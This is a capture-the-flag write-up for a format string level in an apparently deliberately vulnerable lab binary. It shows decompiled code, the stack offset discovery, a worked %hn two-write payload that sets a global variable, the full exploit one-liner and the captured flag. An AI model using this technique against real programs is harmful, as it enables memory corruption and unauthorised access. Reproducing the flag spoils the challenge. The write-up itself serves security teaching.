# 🎯 Level4 - Multi-Word Format String Exploitation

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Advanced format string techniques - writing large values! 🚀

## 📋 Binary Analysis

### 🎯 Key Functions (Decompiled)

```c
void p(char *param_1)
{
  printf(param_1);              // ⚠️ FORMAT STRING VULNERABILITY!
  return;
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c, 0x200, stdin);
  p(local_20c);
  if (m == 0x1025544) {         // If m equals 16,930,116
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

### 🔑 Global Variable
```asm
m                                    XREF[2]: Entry Point(*), n:0804848d(R)  
08049810    00 00 00 00    undefined4    00000000h
```

**Address of `m`**: `0x08049810`

## 🚨 The Challenge

We need to write `0x01025544` (16,930,116 in decimal) to the global variable `m`.

**Why can't we just do this?**
```bash
"\x10\x98\x04\x08" + "%16930112x%12$n"  # ❌ PROBLEMS!
```

**Problems:**
1. ⏱️ **Takes forever** - Printing 16 million characters would take minutes/hours
2. 💥 **Buffer overflow** - Our input buffer is only 512 bytes (0x200)
3. 🚫 **Program might crash** - Memory/performance issues

**Solution**: Write the value in **smaller chunks** instead of all at once!

## 🎯 How the Exploit Works

### Understanding Format String Write Variants

| Specifier | Size | Max Value | Use Case |
|-----------|------|-----------|----------|
| `%n` | 4 bytes (int) | 4,294,967,295 | Full 32-bit value |
| `%hn` | 2 bytes (short) | 65,535 | 16-bit chunks ⚡ |
| `%hhn` | 1 byte (char) | 255 | Byte-by-byte writes |

For level4, we'll use **`%hn`** to write two 16-bit values!

### Breaking Down the Target Value

Let's split `0x01025544` into two 16-bit words:

```
Target: 0x01025544 (16,930,116 decimal)

┌─────────────────┬─────────────────┐
│  Upper 2 bytes  │  Lower 2 bytes  │
│     0x0102      │     0x5544      │
│    (258 dec)    │  (21,828 dec)   │
└─────────────────┴─────────────────┘
```

**Memory Layout:**
```
Address         What to Write
────────────────────────────────
0x08049810  →   0x5544  (lower word)
0x08049812  →   0x0102  (upper word, +2 bytes offset)
```

### The Ascending Order Requirement

**Critical Rule**: Format string byte counters can only **increase**, never decrease!

**Wrong approach:**
```
❌ Write 21,828 first, then write 258
   └─ Can't go backwards from 21,828 to 258!
```

**Correct approach:**
```
✅ Write 258 first (to 0x08049812)
✅ Then write 21,828 (to 0x08049810)
   └─ Ascending: 258 → 21,828 ✓
```

### The Math Breakdown

**Stack Discovery:**
```bash
Input: "AAAA" + "%x."*20
Output: AAAAb7ff26b0.bffffcb4.b7fd0ff4.0.0.bffffc78.804848d.bffffa70.200.b7fd1ac0.b7ff37d0.41414141...
                                                                                                ^^^^^^^^
                                                                                            Position 12!
```

**Payload Structure:**
```python
[\x12\x98\x04\x08][\x10\x98\x04\x08][%250x][%12$hn][%21570x][%13$hn]
       │                  │           │       │        │        │
       │                  │           │       │        │        └─ Write to position 13
       │                  │           │       │        └─ Print 21,570 more chars
       │                  │           │       └─ Write 258 to position 12
       │                  │           └─ Print 250 chars (8+250 = 258 total)
       │                  └─ 0x08049810 (address of m) → goes to position 13
       └─ 0x08049812 (address of m+2) → goes to position 12
```

**Calculation:**
1. **Addresses**: 8 bytes total (4 + 4)
2. **First write**: Need 258 total bytes
   - Already have: 8 bytes (addresses)
   - Need to print: 250 more → `%250x`
   - Total: 258 bytes ✅
3. **Second write**: Need 21,828 total bytes
   - Already have: 258 bytes
   - Need to print: 21,570 more → `%21570x`
   - Total: 21,828 bytes ✅

### Visual: Complete Attack Flow

```
Step 1: Stack Setup
────────────────────
Stack Position 12: 0x08049812 (our first address)
Stack Position 13: 0x08049810 (our second address)


Step 2: printf() Processing
────────────────────────────
Input: "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"

Action 1: Print addresses        → 8 bytes printed
Action 2: Process %250x          → 250 more (258 total)
          └─ Prints stack value in 250-char width
Action 3: Process %12$hn         → Write 258 to position 12
          └─ Position 12 = 0x08049812 (m+2)
Action 4: Process %21570x        → 21,570 more (21,828 total)
          └─ Prints stack value in 21,570-char width
Action 5: Process %13$hn         → Write 21,828 to position 13
          └─ Position 13 = 0x08049810 (m)


Step 3: Memory State
────────────────────
Memory at 0x08049810 (m):
  Before: 0x00000000
  After:  0x01025544 ✅
          ├─ 0x5544 at 0x08049810
          └─ 0x0102 at 0x08049812


Step 4: Condition Check
───────────────────────
if (m == 0x1025544)  → TRUE!


Step 5: Shell Spawn
───────────────────
system("/bin/cat /home/user/level5/.pass") executes! 🎉
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Format string bug** | ✅ | `printf(buffer)` in `p()` lets us inject specifiers |
| **Stack control** | ✅ | Our input appears at stack position 12 |
| **Known target** | ✅ | Global `m` at `0x08049810` (from Ghidra) |
| **Writable memory** | ✅ | Global variables are in writable section |
| **%hn support** | ✅ | printf supports 2-byte writes |
| **Two addresses** | ✅ | We place both m and m+2 on the stack |

### Key Insight

**The Technique**: When target values are too large to print efficiently, split them into smaller chunks using `%hn` (16-bit) or `%hhn` (8-bit) writes to consecutive memory addresses. This transforms an impractical exploit into a fast one!

## 💣 Execute the Exploit

```bash
(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250x%12$hn%21570x%13$hn"'; cat) | ./level4
```

Get the flag:
```bash
cat /home/user/level5/.pass
```

---

> 💡 **Pro Tip**: For values > 65,535, use multiple `%hn` writes or byte-by-byte with `%hhn`. For even more precision, write each byte individually to 4 consecutive addresses!

> ⚠️ **Security Note**: Modern protections like [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) randomize addresses, making format string exploits harder. However, information leaks can still defeat ASLR!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
